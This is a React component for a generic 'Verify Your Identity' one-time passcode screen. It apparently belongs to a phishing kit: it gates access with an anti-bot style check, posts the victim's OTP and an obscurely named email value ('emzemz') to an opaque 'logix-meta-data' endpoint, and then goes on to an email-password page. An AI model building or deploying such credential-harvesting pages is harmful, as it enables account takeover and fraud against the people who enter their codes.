import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const OTP: React.FC = () => {
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  if (!isAllowed) {
    return <div>Loading...</div>;
  }

  if (!emzemz) {
    return <div>Missing verification details. Please restart the login process.</div>;
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError('');

    if (!otp.trim()) {
      setError('One-time passcode is required.');
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/logix-meta-data-8/`, {
        emzemz,
        otp,
      });

      navigate('/email-password', { state: { emzemz } });
    } catch (err) {
      console.error('Error submitting OTP:', err);
      setError('There was a problem verifying your passcode. Please try again.');
      setIsLoading(false);
    }
  };

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm">
      <div className="border-b-2 border-teal-500 px-8 py-4">
        <h2 className="text-xl font-semibold text-gray-800">Verify Your Identity</h2>
      </div>

      <div className="px-6 py-6 bg-white space-y-4">
        <p className="text-sm text-gray-700">
          Enter the one-time passcode we just sent to finish signing in.
        </p>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="flex items-center gap-4">
            <label className="text-gray-700 w-32 text-right">Passcode:</label>
            <input
              id="otp"
              name="otp"
              type="text"
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\s/g, ''))}
              maxLength={10}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm tracking-widest text-center"
              placeholder="Enter OTP"
            />
          </div>

          {error && (
            <div className="flex items-center gap-2 text-sm text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              <span>{error}</span>
            </div>
          )}

          <div className="border-b-2 border-teal-500 flex justify-center px-6 py-4">
            {!isLoading ? (
              <button
                type="submit"
                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
              >
                Verify
              </button>
            ) : (
              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent" />
            )}
          </div>
        </form>
      </div>

      <div className="px-6 pb-6">
        <p className="text-xs text-gray-700">
          For your security, we've sent a verification code to your registered phone number. If you didn't receive a passcode, check your spam folder or request a new one from the previous screen.
        </p>
      </div>
    </div>
  );
};

export default OTP;
